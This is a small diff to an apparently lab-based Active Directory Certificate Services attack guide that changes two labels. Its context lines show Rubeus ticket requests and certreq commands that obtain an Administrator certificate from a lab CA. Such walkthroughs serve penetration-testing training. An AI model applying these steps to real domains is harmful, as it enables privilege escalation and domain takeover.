@@ -76,7 +76,7 @@ PS (createnetonly) > Rubeus.exe asktgt /nowrap /domain:'<domain>' /dc:<dc_ip> /u
 > This step is optional if the CA Issuer's certificate has already been trusted locally (e.g. installed into your local Microsoft Certificate Store).
 
 ```
-PS (runas/createnetonly) > mmc.exe /server:<dc_ip>
+PS (runas) > mmc.exe /server:<dc_ip>
 GUI > CTRL+M (i.e. File > Add/Remove Snap-in) > Certificates > Computer Account > Another computer > DC02 > Check Names
 GUI > Certificates (\\DC02) > \\DC02\Personal > Find Certificates...
     Find in: \\DC02\Personal
@@ -103,7 +103,7 @@ PS (runas) > certreq -f -submit -config "192.168.56.202\ADLAB-DC02-CA" Administr
     Certificate retrieved(Issued) Issued  0x80094004, The Enrollee (CN=Administrator,CN=Users,DC=ADLAB,DC=LOCAL) has no E-Mail name registered in the Active Directory.  The E-Mail name will not be included in the certificate.
 ```
 
-- Computer INF file (e.g. `SRV01`):
+- Computer INF file (e.g. `SRV01$`):
 
 ```powershell
 PS > certreq -f -new SRV01.inf SRV01.req
